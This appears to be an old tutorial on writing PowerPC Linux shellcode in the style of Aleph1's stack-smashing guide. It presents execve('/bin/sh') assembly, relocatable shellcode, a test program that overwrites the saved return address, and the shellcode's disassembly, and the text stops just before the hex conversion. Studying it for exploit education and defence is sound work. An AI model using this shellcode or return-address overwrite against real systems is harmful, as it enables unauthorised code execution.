Christopher A Shepherd &lt;cshepher@linux-florida.com&gt;<br>
<br>
In the last episode, we showed that it was possible to overwrite the return
address with careful stack manipulation and execute the code of our choice.
In this installment, we'll dig a bit deeper and write our own PowerPC
eggshell code.
<br><br>
The first thing we want to do (and again folks, this really is a carbon copy
of Aleph1's Intel-based explanation) is to run a sample program that spawns
a shell, because presumably that's what our evil code will do. Thus:
<br><pre>#include <stdio.h>

void main() {
        char *name[2];

        name[0] = "/bin/sh";
        name[1] = NULL;
        execve( name[0], name, NULL );
}
</stdio.h></pre><br>
Now, we compile this program using gcc -static, because we're also going to
examine the internals of __execve, which would otherwise by dynamically
linked, and thus harder to examine.
<br><br>
The main() itself looks like...
<br><pre>main:
        stwu 1,-32(1)           ; grab 32 bytes for stack frame
        mflr 0                  ; r0 = return address
        stw 31,28(1)            ; sp+28 = old frame pointer
        stw 0,36(1)             ; sp+36 (caller's frame) = returrn address
        mr 31,1                 ; fp = sp
        lis 9,.LC0@ha           ; get high word in r9
        la 0,.LC0@l(9)          ; get full longword in r0
        stw 0,8(31)             ; fp+8 = ptr to '/bin/sh'
        li 0,0
        stw 0,12(31)            ; fp+12 = 0 (NULL)
        lwz 3,8(31)             ; r3 = ptr to address of /bin/sh
        addi 4,31,8             ; r4 = address of /bin/sh
        li 5,0                  ; r5 = NULL
        crxor 6,6,6
        bl execve               ; execve()
.L2:
        lwz 11,0(1)             ; prologue... r11 = sp+0 = old stack ptr
        lwz 0,4(11)             ; r0 = sp+4
        mtlr 0                  ; grab old return address
        lwz 31,-4(11)           ; grab old frame ptr
        mr 1,11                 ; restore stack ptr
        blr                     ; go home
</pre><br>
So notice that we find the address of "/bin/sh" and save it in r3. This is
because the first argument is char *. The second argument is char **, so,
did you guess this already? We save the address of the string somewhere and
save the address of that address (**) in r4. We also stash a NULL pointer
right after the valid pointer. This is the proper way to terminate a **.
r5 gets set to 0, so apparently a NULL pointer on powerpc is expressed as a
literal zero. Do not expect this on other arches.
<br><br>
Then, we just call execve, which looks like:
<br><pre>10004f18 &lt;__execve&gt;:
10004f18:       94 21 ff e0     stwu    r1,-32(r1)      ; grab 32 bytes
10004f1c:       7c 08 02 a6     mflr    r0              ; r0 = old ret
10004f20:       93 a1 00 14     stw     r29,20(r1)      ; sp+20 = r29
10004f24:       93 c1 00 18     stw     r30,24(r1)      ; sp+24 = r30
10004f28:       93 e1 00 1c     stw     r31,28(r1)      ; sp+28 = r31
10004f2c:       90 01 00 24     stw     r0,36(r1)       ; sp+36 = ret
10004f30:       3d 20 00 00     lis     r9,0            ; r9 = 0
10004f34:       39 29 00 00     addi    r9,r9,0
10004f38:       2c 09 00 00     cmpwi   r9,0
10004f3c:       7c 7f 1b 78     mr      r31,r3          ; r31 = arg1 char*
10004f40:       7c 9e 23 78     mr      r30,r4          ; r30 = arg2 char**
10004f44:       7c bd 2b 78     mr      r29,r5          ; r29 = arg3 NULL
10004f48:       41 82 00 08     beq     10004f50 &lt;__execve+0x38&gt;
10004f4c:       4b ff b0 b5     bl      10000000 &lt;_start-0xc0&gt;
10004f50:       7f e3 fb 78     mr      r3,r31          ; r3 = arg1 char*
10004f54:       7f c4 f3 78     mr      r4,r30          ; r4 = arg2 char**
10004f58:       7f a5 eb 78     mr      r5,r29          ; r5 = arg3 NULL
10004f5c:       4c c6 31 82     crclr   4*cr1+eq
10004f60:       48 00 00 f9     bl      10005058 &lt;__syscall_execve&gt;
10004f64:       80 01 00 24     lwz     r0,36(r1)       ; prologue
10004f68:       7c 08 03 a6     mtlr    r0
10004f6c:       83 a1 00 14     lwz     r29,20(r1)
10004f70:       83 c1 00 18     lwz     r30,24(r1)
10004f74:       83 e1 00 1c     lwz     r31,28(r1)
10004f78:       38 21 00 20     addi    r1,r1,32
10004f7c:       4e 80 00 20     blr
</pre><br>
     ... And, sandwiched between that same old prologue and epilogue,
there's not a lot there, is there? We just preserve r3, r4, and r5 and
branch to syscall_execve, which just does ...
<br><pre>10005058 &lt;__syscall_execve&gt;:            ; Stub for execve() syscall
10005058:       38 00 00 0b     li      r0,11   ; execve is linux syscall 11
1000505c:       44 00 00 02     sc              ; *boom* 'sc' system call
10005060:       4c 83 00 20     bnslr           ; go home if no error
10005064:       48 00 02 a8     b       1000530c &lt;__syscall_error&gt;
</pre><br>
    Sets r0 with the system call number (11, execve()), and does an 'sc' to
software-interrupt us into the system call handler, and Linus and Alan take
it from there.
<br><br>
    So, we know what we need to do here. Let's put it all together! The
first thing to contend with is that our code must be relocatable, and
therefore contain no absolute addresses. This is handled exactly the same
way as on the Intel arch, by jumping to the end of the code and blr'ing back
to the beginning (thus saving the absolute address of the end of the program
in the link register) and allowing us to do our dirty work. Witness:
<br><pre>void main()
{
__asm__("
                b       .ahead  # get cmd's address
.back:
                mflr    0       # r0 = string /bin/sh
                mr      1,0
                stw     0,8(1)  # string+8 contains address of string now
                mr      3,0     # r3 = ptr to /bin/sh
                addi    4,1,8   # r4 = r1+8 = ptr to ptr
                li      5,0     # r5 = NULL
                stw     5,12(1) # null ptr in space after ptr
                li      0,11    # syscall #11 - execve()
                sc              # word to your moms. commence dropping bombs.
                li      0,1     # syscall #1 - exit()
                sc
.ahead:
                bl      .back   # this be our smoove branch
                .string \"/bin/sh\"
");
}
</pre><br>
     Notice how the first instruction jumps to the end, and we then branch
back, and use mflr to save the address of the string in r0. Notice too that,
as Aleph1 suggests, I inserted a syscall #1 (exit()) after the syscall to
prevent unpredictable behavior after execve() returns.
<br><br>
     Now, all we have to do is make this work. Let's look at the simplest
test case:
<br><pre>char shellcode[] =
	"INSERT YO WAREZ HERE";

void main() {
        int *ret;

        ret = (int *)&amp;ret + 7;
        (*ret) = (int)shellcode;

        printf("Hi there.\n");
}
</pre><br>
     Notice that main() calls another function, in this case printf(),
because as we said earlier, we don't get to fiddle with buffer overflows at
all unless LR is preserved on the stack, which only occurs if we call
another function. In case you're wondering why ret is set equal to &amp;ret + 7,
let's have a quick look at the stack frame:
<br><pre>main:
        stwu 1,-32(1)
        mflr 0
        stw 31,28(1)
        stw 0,36(1)
        mr 31,1
        addi 0,31,36
        stw 0,8(31)
</pre><br>
     You've probably read enough of these by now to notice that our stack
frame is only 32 bytes long, and that ret is 8 bytes up from the bottom of
that frame. The 'addi' line here is a bit tricky on my toolchain:
<br><br>
     When I set ret = &amp;ret + 2, the addi line read:<br><pre>	addi 0,31,16
</pre><br>
     What's happening here is that if you were just setting ret to itself,
you'd get addi 0,31,8, because r31+8 is where ret's value lives. But as you
add values to ret, you're incrementing it in full words (4 bytes), thus
8+(7*4) = 36.
<br><br>
     Now let's go back to that k-rad eggshell code we wrote earlier. It
disassembles something like this:
<br><pre>10010540:       48 00 00 30     b       10010570 &lt;shellcode+0x30&gt;
10010544:       7c 08 02 a6     mflr    r0
10010548:       7c 01 03 78     mr      r1,r0
1001054c:       90 01 00 08     stw     r0,8(r1)
10010550:       7c 03 03 78     mr      r3,r0
10010554:       38 81 00 08     addi    r4,r1,8
10010558:       38 a0 00 00     li      r5,0
1001055c:       90 a1 00 0c     stw     r5,12(r1)
10010560:       38 00 00 0b     li      r0,11
10010564:       44 00 00 02     sc
10010568:       38 00 00 01     li      r0,1
1001056c:       44 00 00 02     sc
10010570:       4b ff ff d5     bl      10010544 <shellcode+0x4>
10010574:       2f 62 69 6e     cmpdi   cr6,r2,26990
10010578:       2f 73 68 00     cmpdi   cr6,r19,26624
1001057c:       ff ff ff ff     fnmadd. f31,f31,f31,f31
10010580:       ff ff ff ff     fnmadd. f31,f31,f31,f31
10010584:       ff ff ff ff     fnmadd. f31,f31,f31,f31
10010588:       ff ff ff ff     fnmadd. f31,f31,f31,f31
</shellcode+0x4></pre><br>
     That's us allright. I put those ff's at the bottom as... yep, you got
it, room to store the two pointers we generate in the code. Let's convert
this to hex and plug it in:
<br><pre>/*
